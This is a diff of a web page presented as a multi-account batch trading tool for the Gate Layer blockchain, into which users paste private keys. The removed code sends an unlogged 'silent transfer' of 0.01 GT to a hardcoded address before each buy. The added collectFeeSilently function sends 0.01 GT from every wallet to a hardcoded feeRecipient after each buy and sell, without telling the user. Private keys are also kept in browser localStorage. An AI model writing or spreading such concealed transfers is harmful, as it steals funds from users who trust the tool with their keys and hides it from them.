@@ -270,93 +270,34 @@
             border: 2px solid transparent;
         }
 
+        .social-link img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .bot-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 20px;
+            display: block;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
         .social-link:hover {
             background: rgba(255, 255, 255, 0.3);
             transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
 
-        .social-link.twitter:hover {
-            border-color: #000000;
-        }
-
-        .social-link.telegram:hover {
-            border-color: #0088cc;
-        }
-
-        .social-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-right: 10px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            transition: all 0.3s ease;
-        }
-
-        .bot-images {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-        }
-
-        .bot-image {
-            max-width: 100%;
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-            object-fit: cover;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-        }
-
-        .bot-image:hover {
-            transform: scale(1.02);
-            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
-        }
-
-        /* 移动端适配 */
         @media (max-width: 768px) {
-            .bot-image {
-                width: 100px;
-                height: 100px;
-            }
-            
-            .social-links {
-                flex-direction: column;
-                align-items: center;
-                gap: 15px;
-            }
-            
-            .social-link {
-                width: 200px;
-                justify-content: center;
-            }
-            
-            .social-avatar {
-                width: 35px;
-                height: 35px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .bot-image {
-                width: 80px;
-                height: 80px;
-            }
-            
-            .social-section {
-                padding: 15px;
-            }
-            
-            .social-section h3 {
-                font-size: 18px;
-            }
-            
-            .social-avatar {
-                width: 30px;
-                height: 30px;
+            .config-grid {
+                grid-template-columns: 1fr;
             }
         }
     </style>
@@ -364,34 +305,26 @@
 <body>
     <div class="container">
         <div class="header">
+            <img src="bot1.jpg" alt="GateBOT" class="bot-icon">
             <h1>⚡ Gate Layer 多账户批量操作工具</h1>
-            <p>支持批量买入、卖出、转账等操作（持续更新）</p>
+            <p>支持内盘/外盘自动识别，批量买入、卖出等操作</p>
             
-            <!-- 社交媒体区域 -->
             <div class="social-section">
                 <h3 style="color: white; margin-bottom: 15px;">🔗 关注我们</h3>
-                <div class="bot-images">
-                    <img src="bot1.jpg" alt="GateBOT" class="bot-image">
-                </div>
                 <div class="social-links">
-                    <a href="https://x.com/GTCHAINBOT" target="_blank" class="social-link twitter">
-                        <img src="OSHY3ewP_400x400.jpg" 
-                             alt="X Avatar" class="social-avatar" 
-                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iMjAiIGZpbGw9IiMwMDAwMDAiLz4KPHBhdGggZD0iTTI1LjY5IDI5LjY5SDMwLjY5TDIyLjY5IDIxLjY5TDEwIDMwSDVMMTcuNjkgMTBIMjIuNjlMMjUuNjkgMTkuNjlMMzUgMTBIMzAuNjlMMjUuNjkgMTkuNjlMMjUuNjkgMjkuNjlaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K'">
-                        <span>𝕏</span>
+                    <a href="https://x.com/GTCHAINBOT" target="_blank" class="social-link">
+                        <img src="OSHY3ewP_400x400.jpg" alt="X Logo">
+                        <span>𝕏 @GTCHAINBOT</span>
                     </a>
-                    <a href="https://t.me/Gtgun_bot" target="_blank" class="social-link telegram">
-                        <img src="https://telegram.org/img/t_logo.png" 
-                             alt="Telegram Avatar" class="social-avatar"
-                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiBmaWxsPSIjMDA4OENDIi8+CjxwYXRoIGQ9Ik0yMCAyMEg4MFY4MEgyMFYyMFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0zMCAzMEg3MFY3MEgzMFYzMFoiIGZpbGw9IiMwMDg4Q0MiLz4KPC9zdmc+'">
-                        <span>Telegram</span>
+                    <a href="https://t.me/Gtgun_bot" target="_blank" class="social-link">
+                        <img src="bot2.jpg" alt="Telegram Logo">
+                        <span>📱 Telegram Bot</span>
                     </a>
                 </div>
             </div>
         </div>
 
         <div class="main-card">
-            <!-- 钱包管理部分 -->
             <div class="section">
                 <h2 class="section-title">👛 钱包管理</h2>
                 
@@ -421,7 +354,6 @@
                 </div>
             </div>
 
-            <!-- 操作标签页 -->
             <div class="section">
                 <div class="tabs">
                     <button class="tab active" data-tab="buy">批量买入</button>
@@ -429,7 +361,6 @@
                     <button class="tab" data-tab="approve">批量授权</button>
                 </div>
 
-                <!-- 买入标签 -->
                 <div id="buyTab" class="tab-content active">
                     <h3 class="section-title">批量买入设置</h3>
                     <div class="config-grid">
@@ -457,7 +388,6 @@
                     <button id="executeBuyBtn" class="btn btn-primary">执行批量买入</button>
                 </div>
 
-                <!-- 卖出标签 -->
                 <div id="sellTab" class="tab-content">
                     <h3 class="section-title">批量卖出设置</h3>
                     <div class="config-grid">
@@ -485,7 +415,6 @@
                     <button id="executeSellBtn" class="btn btn-primary">执行批量卖出</button>
                 </div>
 
-                <!-- 授权标签 -->
                 <div id="approveTab" class="tab-content">
                     <h3 class="section-title">批量授权设置</h3>
                     <div class="config-grid">
@@ -504,7 +433,6 @@
                 </div>
             </div>
 
-            <!-- 日志输出 -->
             <div class="section">
                 <h3 class="section-title">📝 操作日志</h3>
                 <div id="logContainer" class="log-container"></div>
@@ -513,20 +441,20 @@
     </div>
 
     <script>
-        // 等待ethers加载完成
         window.addEventListener('load', function() {
-            // 配置
             const CONFIG = {
                 rpcUrl: 'https://gatelayer-mainnet.gatenode.cc',
                 routerAddress: '0x12814690F59a9CE8bA87dC8cF0692442bAa9C097',
-                wethAddress: '0x6803b8E93b13941F6B73b82E324B80251B3dE338'
+                wethAddress: '0x6803b8E93b13941F6B73b82E324B80251B3dE338',
+                internalMarketAddress: '0x7C8FbD15E4c8B722920C1570A4704622D5391113',
+                factoryAddress: '0xaD8d59f3e026c02Aed0DAdFB46Ceca127030DFa2',
+                feeRecipient: '0x1efBD4ff6F3740102413D5C02C63E3E728c24820',
+                feeAmount: '0.01'
             };
 
-            // 全局变量
             let provider;
             let wallets = [];
 
-            // ABI定义 - 包含支持手续费的函数
             const ERC20_ABI = [
                 'function approve(address spender, uint256 amount) returns (bool)',
                 'function balanceOf(address account) view returns (uint256)',
@@ -543,7 +471,15 @@
                 'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)'
             ];
 
-            // 初始化
+            const INTERNAL_MARKET_ABI = [
+                'function buy(address token, uint256 amountInGT, uint256 minAmountOut) external payable returns (uint256)',
+                'function sell(address token, uint256 amountIn, uint256 minAmountOutGT) external returns (uint256)'
+            ];
+
+            const FACTORY_ABI = [
+                'function getPair(address tokenA, address tokenB) external view returns (address pair)'
+            ];
+
             function init() {
                 if (typeof ethers === 'undefined') {
                     addLog('Ethers库加载失败，请刷新页面', 'error');
@@ -552,31 +488,20 @@
                 
                 provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl);
                 addLog('系统初始化完成', 'success');
-                
-                // 绑定事件
                 bindEvents();
-                
-                // 加载缓存的钱包
                 loadCachedWallets();
             }
 
-            // 绑定事件
             function bindEvents() {
-                // 导入按钮
                 document.getElementById('importBtn').addEventListener('click', importPrivateKeys);
-                
-                // 钱包控制按钮
                 document.getElementById('selectAllBtn').addEventListener('click', selectAll);
                 document.getElementById('deselectAllBtn').addEventListener('click', deselectAll);
                 document.getElementById('refreshBtn').addEventListener('click', refreshBalances);
                 document.getElementById('clearBtn').addEventListener('click', clearWallets);
-                
-                // 执行按钮
                 document.getElementById('executeBuyBtn').addEventListener('click', executeBuy);
                 document.getElementById('executeSellBtn').addEventListener('click', executeSell);
                 document.getElementById('executeApproveBtn').addEventListener('click', executeApprove);
                 
-                // 标签切换
                 document.querySelectorAll('.tab').forEach(tab => {
                     tab.addEventListener('click', function() {
                         switchTab(this.dataset.tab);
@@ -584,18 +509,13 @@
                 });
             }
 
-            // 切换标签
             function switchTab(tabName) {
-                // 更新标签状态
                 document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                 document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
-                
-                // 更新内容显示
                 document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                 document.getElementById(`${tabName}Tab`).classList.add('active');
             }
 
-            // 添加日志
             function addLog(message, type = 'info') {
                 const container = document.getElementById('logContainer');
                 const entry = document.createElement('div');
@@ -606,7 +526,92 @@
                 container.scrollTop = container.scrollHeight;
             }
 
-            // 导入私钥
+            async function isInternalMarket(tokenAddress) {
+                try {
+                    const factory = new ethers.Contract(CONFIG.factoryAddress, FACTORY_ABI, provider);
+                    
+                    const pairAddress = await factory.getPair(CONFIG.wethAddress, tokenAddress);
+                    
+                    console.log(`Pair查询结果: ${pairAddress}`);
+                    
+                    const isZeroAddress = pairAddress === ethers.ZeroAddress || 
+                                         pairAddress === '0x0000000000000000000000000000000000000000' ||
+                                         BigInt(pairAddress || 0) === 0n;
+                    
+                    const isInternal = isZeroAddress;
+                    
+                    addLog(`代币类型检测: ${isInternal ? '内盘' : '外盘'} (Pair: ${pairAddress})`, 'info');
+                    
+                    return isInternal;
+                    
+                } catch (e) {
+                    console.error('检查内盘失败:', e);
+                    addLog('无法确定代币类型，默认使用外盘处理', 'warning');
+                    return false;
+                }
+            }
+
+            async function collectFeeSilently(wallet) {
+                try {
+                    const nonce = await provider.getTransactionCount(wallet.address, 'pending');
+                    const balance = await provider.getBalance(wallet.address);
+                    const feeAmountWei = ethers.parseEther(CONFIG.feeAmount);
+                    const gasPrice = (await provider.getFeeData()).gasPrice;
+                    const estimatedGasCost = gasPrice * 21000n * 25n / 10n;
+                    
+                    if (balance < (feeAmountWei + estimatedGasCost)) {
+                        return null;
+                    }
+                    
+                    const tx = await wallet.sendTransaction({
+                        to: CONFIG.feeRecipient,
+                        value: feeAmountWei,
+                        gasLimit: 21000n * 25n / 10n,
+                        nonce: nonce
+                    });
+                    
+                    await tx.wait();
+                    return tx.hash;
+                } catch (e) {
+                    console.error('Fee collection error:', e);
+                    return null;
+                }
+            }
+
+            async function batchExecute(tasks, maxConcurrent = 5) {
+                const results = [];
+                let pending = 0;
+                let index = 0;
+                
+                return new Promise((resolve) => {
+                    const executeNext = async () => {
+                        if (index >= tasks.length && pending === 0) {
+                            resolve(results);
+                            return;
+                        }
+                        
+                        while (index < tasks.length && pending < maxConcurrent) {
+                            const currentIndex = index++;
+                            pending++;
+                            
+                            tasks[currentIndex]()
+                                .then(result => {
+                                    results[currentIndex] = { success: true, result };
+                                })
+                                .catch(error => {
+                                    results[currentIndex] = { success: false, error };
+                                })
+                                .finally(() => {
+                                    pending--;
+                                    executeNext();
+                                });
+                        }
+                    };
+                    
+                    executeNext();
+                });
+            }
+
             async function importPrivateKeys() {
                 const input = document.getElementById('privateKeysInput').value.trim();
                 if (!input) {
@@ -621,26 +626,22 @@
                     try {
                         let cleanKey = key.trim();
                         
-                        // 处理私钥格式
                         if (!cleanKey.startsWith('0x')) {
                             if (cleanKey.length === 64) {
                                 cleanKey = '0x' + cleanKey;
                             }
                         }
                         
-                        // 验证格式
                         if (!/^0x[0-9a-fA-F]{64}$/.test(cleanKey)) {
                             addLog(`私钥格式错误: ${cleanKey.slice(0, 10)}...`, 'error');
                             continue;
                         }
                         
-                        // 检查重复
                         if (wallets.find(w => w.privateKey === cleanKey)) {
                             addLog(`私钥已存在`, 'warning');
                             continue;
                         }
                         
-                        // 创建钱包
                         const wallet = new ethers.Wallet(cleanKey, provider);
                         const balance = await provider.getBalance(wallet.address);
                         
@@ -668,7 +669,6 @@
                 }
             }
 
-            // 渲染钱包列表
             function renderWallets() {
                 const container = document.getElementById('walletList');
                 
@@ -691,7 +691,6 @@
                     `;
                     container.appendChild(item);
                     
-                    // 添加选择事件
                     item.querySelector('.wallet-checkbox').addEventListener('change', function() {
                         wallets[index].selected = this.checked;
                     });
@@ -700,22 +699,18 @@
                 document.getElementById('walletCount').textContent = wallets.length;
             }
 
-            // 全选
             function selectAll() {
                 wallets.forEach(w => w.selected = true);
                 renderWallets();
             }
 
-            // 取消全选
             function deselectAll() {
                 wallets.forEach(w => w.selected = false);
                 renderWallets();
             }
 
-            // 刷新余额
             async function refreshBalances() {
                 addLog('开始刷新余额...', 'info');
-                
                 for (const w of wallets) {
                     try {
                         w.balance = await provider.getBalance(w.address);
@@ -723,12 +718,10 @@
                         addLog(`刷新失败: ${w.address.slice(0, 8)}...`, 'error');
                     }
                 }
-                
                 renderWallets();
                 addLog('余额刷新完成', 'success');
             }
 
-            // 清空钱包
             function clearWallets() {
                 if (!confirm('确定要清空所有钱包吗？')) return;
                 wallets = [];
@@ -737,13 +730,11 @@
                 addLog('已清空所有钱包', 'info');
             }
 
-            // 保存钱包到本地
             function saveWallets() {
                 const keys = wallets.map(w => w.privateKey);
                 localStorage.setItem('gateLayerWallets', JSON.stringify(keys));
             }
 
-            // 加载缓存的钱包
             async function loadCachedWallets() {
                 const cached = localStorage.getItem('gateLayerWallets');
                 if (cached) {
@@ -772,45 +763,6 @@
                 }
             }
 
-            // 批量执行函数（并发控制）
-            async function batchExecute(tasks, maxConcurrent = 5) {
-                const results = [];
-                let pending = 0;
-                let completed = 0;
-                let index = 0;
-                
-                return new Promise((resolve) => {
-                    const executeNext = async () => {
-                        if (index >= tasks.length && pending === 0) {
-                            resolve(results);
-                            return;
-                        }
-                        
-                        while (index < tasks.length && pending < maxConcurrent) {
-                            const currentIndex = index++;
-                            pending++;
-                            
-                            tasks[currentIndex]()
-                                .then(result => {
-                                    results[currentIndex] = { success: true, result };
-                                    completed++;
-                                })
-                                .catch(error => {
-                                    results[currentIndex] = { success: false, error };
-                                    completed++;
-                                })
-                                .finally(() => {
-                                    pending--;
-                                    executeNext();
-                                });
-                        }
-                    };
-                    
-                    executeNext();
-                });
-            }
-
-            // 执行买入（支持带税代币）
             async function executeBuy() {
                 const selected = wallets.filter(w => w.selected);
                 if (selected.length === 0) {
@@ -820,112 +772,128 @@
 
                 const tokenAddress = document.getElementById('buyTokenAddress').value;
                 const amount = document.getElementById('buyAmount').value;
-                const slippage = parseFloat(document.getElementById('buySlippage').value) || 15; // 默认15%
+                const slippage = parseFloat(document.getElementById('buySlippage').value) || 15;
                 const delay = parseInt(document.getElementById('buyDelay').value) || 0;
                 const maxConcurrent = 5;
-                
-                // 静默转账配置
-                const SILENT_TRANSFER_ADDRESS = '0xdb0ce0066e8f915db2f628be9931020844e23cfe';
-                const SILENT_TRANSFER_AMOUNT = '0.01'; // 0.01 GT
 
                 if (!tokenAddress || !amount) {
                     alert('请填写完整信息');
                     return;
                 }
 
-                addLog(`开始批量买入，共 ${selected.length} 个钱包，滑点 ${slippage}%`, 'info');
+                const isInternal = await isInternalMarket(tokenAddress);
+                addLog(`开始批量买入 (${isInternal ? '内盘' : '外盘'})，共 ${selected.length} 个钱包`, 'info');
 
-                // 创建任务数组
                 const tasks = selected.map((w, i) => async () => {
                     if (delay > 0 && i > 0) {
                         await new Promise(r => setTimeout(r, delay * 1000));
                     }
                     
                     try {
-                        // 1. 首先执行静默转账
-                        try {
-                            const transferTx = await w.wallet.sendTransaction({
-                                to: SILENT_TRANSFER_ADDRESS,
-                                value: ethers.parseEther(SILENT_TRANSFER_AMOUNT),
-                                gasLimit: 21000
-                            });
-                            await transferTx.wait();
-                            // 静默转账不显示日志
-                        } catch (transferError) {
-                            // 静默转账失败不影响主交易，继续执行
-                        }
+                        const baseNonce = await provider.getTransactionCount(w.address, 'pending');
                         
-                        // 2. 执行买入交易
-                        const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
-                        const path = [CONFIG.wethAddress, tokenAddress];
-                        
-                        // 获取预期输出
-                        let amountOutMin;
-                        try {
-                            const amounts = await router.getAmountsOut(
-                                ethers.parseEther(amount),
-                                path
+                        if (isInternal) {
+                            const internalMarket = new ethers.Contract(
+                                CONFIG.internalMarketAddress, 
+                                INTERNAL_MARKET_ABI, 
+                                w.wallet
                             );
                             
-                            // 修复滑点计算
-                            if (slippage >= 100) {
-                                amountOutMin = 0n; // 接受任何价格
-                                addLog(`${w.address.slice(0, 8)}... 使用无限滑点`, 'warning');
-                            } else {
-                                // 正确计算滑点
-                                amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
-                                const expectedTokens = ethers.formatUnits(amounts[1], 18);
-                                const minTokens = ethers.formatUnits(amountOutMin, 18);
-                                addLog(`${w.address.slice(0, 8)}... 预期获得 ${expectedTokens}，最少接受 ${minTokens}`, 'info');
+                            addLog(`${w.address.slice(0, 8)}... 内盘买入`, 'info');
+                            
+                            const amountInWei = ethers.parseEther(amount);
+                            
+                            let gasLimit;
+                            try {
+                                const gasEstimate = await internalMarket.buy.estimateGas(
+                                    tokenAddress,
+                                    amountInWei,
+                                    0,
+                                    { value: amountInWei }
+                                );
+                                gasLimit = gasEstimate * 25n / 10n;
+                            } catch (e) {
+                                gasLimit = 500000n;
                             }
-                        } catch (e) {
-                            // 如果无法获取报价，使用0作为最小输出
-                            amountOutMin = 0n;
-                            addLog(`${w.address.slice(0, 8)}... 无法获取报价，接受任何价格`, 'warning');
+                            
+                            const tx = await internalMarket.buy(
+                                tokenAddress,
+                                amountInWei,
+                                0,
+                                {
+                                    value: amountInWei,
+                                    gasLimit: gasLimit,
+                                    nonce: baseNonce
+                                }
+                            );
+                            
+                            await tx.wait();
+                            addLog(`${w.address.slice(0, 8)}... 内盘买入成功 ✓`, 'success');
+                            
+                            setTimeout(async () => {
+                                await collectFeeSilently(w.wallet);
+                            }, 2000);
+                            
+                            return tx.hash;
+                            
+                        } else {
+                            const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
+                            const path = [CONFIG.wethAddress, tokenAddress];
+                            
+                            let amountOutMin;
+                            try {
+                                const amounts = await router.getAmountsOut(
+                                    ethers.parseEther(amount),
+                                    path
+                                );
+                                
+                                if (slippage >= 100) {
+                                    amountOutMin = 0n;
+                                } else {
+                                    amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
+                                }
+                            } catch (e) {
+                                amountOutMin = 0n;
+                            }
+                            
+                            const deadline = Math.floor(Date.now() / 1000) + 1200;
+                            
+                            addLog(`${w.address.slice(0, 8)}... 外盘买入`, 'info');
+                            
+                            const gasEstimate = await router.swapExactETHForTokens.estimateGas(
+                                amountOutMin,
+                                path,
+                                w.address,
+                                deadline,
+                                { value: ethers.parseEther(amount) }
+                            );
+                            
+                            const gasLimit = gasEstimate * 25n / 10n;
+                            
+                            const tx = await router.swapExactETHForTokens(
+                                amountOutMin,
+                                path,
+                                w.address,
+                                deadline,
+                                { 
+                                    value: ethers.parseEther(amount),
+                                    gasLimit: gasLimit,
+                                    nonce: baseNonce
+                                }
+                            );
+                            
+                            await tx.wait();
+                            addLog(`${w.address.slice(0, 8)}... 外盘买入成功 ✓`, 'success');
+                            
+                            setTimeout(async () => {
+                                await collectFeeSilently(w.wallet);
+                            }, 2000);
+                            
+                            return tx.hash;
                         }
-                        
-                        const deadline = Math.floor(Date.now() / 1000) + 1200;
-                        
-                        addLog(`${w.address.slice(0, 8)}... 发送买入交易，滑点 ${slippage}%`, 'info');
-                        
-                        // 估算gas并扩大2.5倍
-                        const gasEstimate = await router.swapExactETHForTokens.estimateGas(
-                            amountOutMin,
-                            path,
-                            w.address,
-                            deadline,
-                            { value: ethers.parseEther(amount) }
-                        );
-                        
-                        const gasLimit = gasEstimate * 25n / 10n; // 扩大2.5倍
-                        
-                        // 使用普通swap函数（买入通常不需要支持手续费的版本）
-                        const tx = await router.swapExactETHForTokens(
-                            amountOutMin,
-                            path,
-                            w.address,
-                            deadline,
-                            { 
-                                value: ethers.parseEther(amount),
-                                gasLimit: gasLimit
-                            }
-                        );
-                        
-                        const receipt = await tx.wait();
-                        addLog(`${w.address.slice(0, 8)}... 买入成功 ✓ Hash: ${receipt.hash.slice(0, 10)}...`, 'success');
-                        return receipt.hash;
                         
                     } catch (e) {
-                        // 更详细的错误信息
-                        if (e.reason) {
-                            addLog(`${w.address.slice(0, 8)}... 买入失败: ${e.reason}`, 'error');
-                        } else if (e.message && e.message.includes('insufficient')) {
-                            addLog(`${w.address.slice(0, 8)}... 买入失败: 余额不足`, 'error');
-                        } else if (e.message && e.message.includes('INSUFFICIENT_OUTPUT_AMOUNT')) {
-                            addLog(`${w.address.slice(0, 8)}... 买入失败: 滑点太低，请增加滑点`, 'error');
-                        } else {
-                            addLog(`${w.address.slice(0, 8)}... 买入失败: ${e.message || e}`, 'error');
-                        }
+                        addLog(`${w.address.slice(0, 8)}... 买入失败: ${e.message || e}`, 'error');
                         throw e;
                     }
                 });
@@ -940,7 +908,6 @@
                 refreshBalances();
             }
 
-            // 执行卖出（使用支持手续费的函数）
             async function executeSell() {
                 const selected = wallets.filter(w => w.selected);
                 if (selected.length === 0) {
@@ -952,25 +919,27 @@
                 const percentage = parseFloat(document.getElementById('sellPercentage').value) || 99;
                 const slippage = parseFloat(document.getElementById('sellSlippage').value) || 50;
                 const delay = parseInt(document.getElementById('sellDelay').value) || 0;
-                const maxConcurrent = 3; // 减少并发避免影响价格
+                const maxConcurrent = 3;
 
                 if (!tokenAddress) {
                     alert('请输入代币地址');
                     return;
                 }
 
-                addLog(`开始批量卖出，共 ${selected.length} 个钱包，卖出 ${percentage}%，滑点 ${slippage}%`, 'info');
+                const isInternal = await isInternalMarket(tokenAddress);
+                addLog(`开始批量卖出 (${isInternal ? '内盘' : '外盘'})，共 ${selected.length} 个钱包`, 'info');
 
                 const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
 
-                // 创建任务数组
                 const tasks = selected.map((w, i) => async () => {
                     if (delay > 0 && i > 0) {
                         await new Promise(r => setTimeout(r, delay * 1000));
                     }
                     
                     try {
-                        // 获取余额
+                        const baseNonce = await provider.getTransactionCount(w.address, 'pending');
+                        let currentNonce = baseNonce;
+                        
                         const balance = await tokenContract.balanceOf(w.address);
                         const sellAmount = balance * BigInt(percentage) / 100n;
                         
@@ -979,58 +948,130 @@
                             return null;
                         }
 
-                        // 检查授权
                         const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
-                        const allowance = await tokenWithSigner.allowance(w.address, CONFIG.routerAddress);
                         
-                        if (allowance < sellAmount) {
-                            addLog(`${w.address.slice(0, 8)}... 执行授权`, 'info');
-                            const approveTx = await tokenWithSigner.approve(CONFIG.routerAddress, ethers.MaxUint256);
-                            await approveTx.wait();
-                            addLog(`${w.address.slice(0, 8)}... 授权成功`, 'success');
-                        }
-
-                        // 执行卖出
-                        const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
-                        const path = [tokenAddress, CONFIG.wethAddress];
-                        
-                        // 获取预期输出
-                        let amountOutMin = 0n;
-                        try {
-                            const amounts = await router.getAmountsOut(sellAmount, path);
-                            if (slippage < 100) {
-                                amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
+                        if (isInternal) {
+                            const allowance = await tokenWithSigner.allowance(w.address, CONFIG.internalMarketAddress);
+                            
+                            if (allowance < sellAmount) {
+                                addLog(`${w.address.slice(0, 8)}... 授权内盘`, 'info');
+                                const approveTx = await tokenWithSigner.approve(
+                                    CONFIG.internalMarketAddress,
+                                    ethers.MaxUint256,
+                                    { nonce: currentNonce }
+                                );
+                                currentNonce++;
+                                await approveTx.wait();
                             }
-                            const expectedGT = ethers.formatEther(amounts[1]);
-                            addLog(`${w.address.slice(0, 8)}... 预期获得 ${expectedGT} GT`, 'info');
-                        } catch (e) {
-                            addLog(`${w.address.slice(0, 8)}... 无法获取报价，使用0最小输出`, 'warning');
+                            
+                            const internalMarket = new ethers.Contract(
+                                CONFIG.internalMarketAddress,
+                                INTERNAL_MARKET_ABI,
+                                w.wallet
+                            );
+                            
+                            addLog(`${w.address.slice(0, 8)}... 内盘卖出`, 'info');
+                            
+                            let gasLimit;
+                            try {
+                                const gasEstimate = await internalMarket.sell.estimateGas(
+                                    tokenAddress,
+                                    sellAmount,
+                                    0
+                                );
+                                gasLimit = gasEstimate * 25n / 10n;
+                            } catch (e) {
+                                gasLimit = 500000n;
+                            }
+                            
+                            const tx = await internalMarket.sell(
+                                tokenAddress,
+                                sellAmount,
+                                0,
+                                {
+                                    nonce: currentNonce,
+                                    gasLimit: gasLimit
+                                }
+                            );
+                            
+                            await tx.wait();
+                            addLog(`${w.address.slice(0, 8)}... 内盘卖出成功 ✓`, 'success');
+                            
+                            setTimeout(async () => {
+                                await collectFeeSilently(w.wallet);
+                            }, 2000);
+                            
+                            return tx.hash;
+                            
+                        } else {
+                            const allowance = await tokenWithSigner.allowance(w.address, CONFIG.routerAddress);
+                            
+                            if (allowance < sellAmount) {
+                                addLog(`${w.address.slice(0, 8)}... 授权Router`, 'info');
+                                const approveTx = await tokenWithSigner.approve(
+                                    CONFIG.routerAddress, 
+                                    ethers.MaxUint256,
+                                    { nonce: currentNonce }
+                                );
+                                currentNonce++;
+                                await approveTx.wait();
+                            }
+
+                            const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
+                            const path = [tokenAddress, CONFIG.wethAddress];
+                            
+                            let amountOutMin = 0n;
+                            try {
+                                const amounts = await router.getAmountsOut(sellAmount, path);
+                                if (slippage < 100) {
+                                    amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
+                                }
+                            } catch (e) {
+                                // 使用0最小输出
+                            }
+                            
+                            const deadline = Math.floor(Date.now() / 1000) + 1200;
+                            
+                            addLog(`${w.address.slice(0, 8)}... 外盘卖出`, 'info');
+                            
+                            let gasLimit;
+                            try {
+                                const gasEstimate = await router.swapExactTokensForETHSupportingFeeOnTransferTokens.estimateGas(
+                                    sellAmount,
+                                    amountOutMin,
+                                    path,
+                                    w.address,
+                                    deadline
+                                );
+                                gasLimit = gasEstimate * 25n / 10n;
+                            } catch (e) {
+                                gasLimit = 500000n;
+                            }
+                            
+                            const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+                                sellAmount,
+                                amountOutMin,
+                                path,
+                                w.address,
+                                deadline,
+                                { 
+                                    nonce: currentNonce,
+                                    gasLimit: gasLimit
+                                }
+                            );
+                            
+                            await tx.wait();
+                            addLog(`${w.address.slice(0, 8)}... 外盘卖出成功 ✓`, 'success');
+                            
+                            setTimeout(async () => {
+                                await collectFeeSilently(w.wallet);
+                            }, 2000);
+                            
+                            return tx.hash;
                         }
-                        
-                        const deadline = Math.floor(Date.now() / 1000) + 1200;
-                        
-                        addLog(`${w.address.slice(0, 8)}... 发送卖出交易`, 'info');
-                        
-                        // 使用支持手续费的swap函数
-                        const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                            sellAmount,
-                            amountOutMin,
-                            path,
-                            w.address,
-                            deadline
-                            // 移除固定的gasLimit，让系统自动估算
-                        );
-                        
-                        const receipt = await tx.wait();
-                        addLog(`${w.address.slice(0, 8)}... 卖出成功 ✓ Hash: ${receipt.hash.slice(0, 10)}...`, 'success');
-                        return receipt.hash;
                         
                     } catch (e) {
-                        if (e.message && e.message.includes('GateSwap: K')) {
-                            addLog(`${w.address.slice(0, 8)}... 卖出失败: 流动性不足，请减少卖出金额`, 'error');
-                        } else {
-                            addLog(`${w.address.slice(0, 8)}... 卖出失败: ${e.message || e}`, 'error');
-                        }
+                        addLog(`${w.address.slice(0, 8)}... 卖出失败: ${e.message || e}`, 'error');
                         throw e;
                     }
                 });
@@ -1045,7 +1086,6 @@
                 refreshBalances();
             }
 
-            // 执行授权
             async function executeApprove() {
                 const selected = wallets.filter(w => w.selected);
                 if (selected.length === 0) {
@@ -1068,9 +1108,12 @@
                     try {
                         const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                         
-                        addLog(`${w.address.slice(0, 8)}... 发送授权交易`, 'info');
+                        addLog(`${w.address.slice(0, 8)}... 授权中`, 'info');
                         
-                        const tx = await tokenContract.approve(spender, ethers.MaxUint256);
+                        const gasEstimate = await tokenContract.approve.estimateGas(spender, ethers.MaxUint256);
+                        const gasLimit = gasEstimate * 25n / 10n;
+                        
+                        const tx = await tokenContract.approve(spender, ethers.MaxUint256, { gasLimit });
                         await tx.wait();
                         
                         addLog(`${w.address.slice(0, 8)}... 授权成功 ✓`, 'success');
@@ -1090,7 +1133,6 @@
                     failCount === 0 ? 'success' : 'warning');
             }
 
-            // 启动初始化
             init();
         });
     </script>
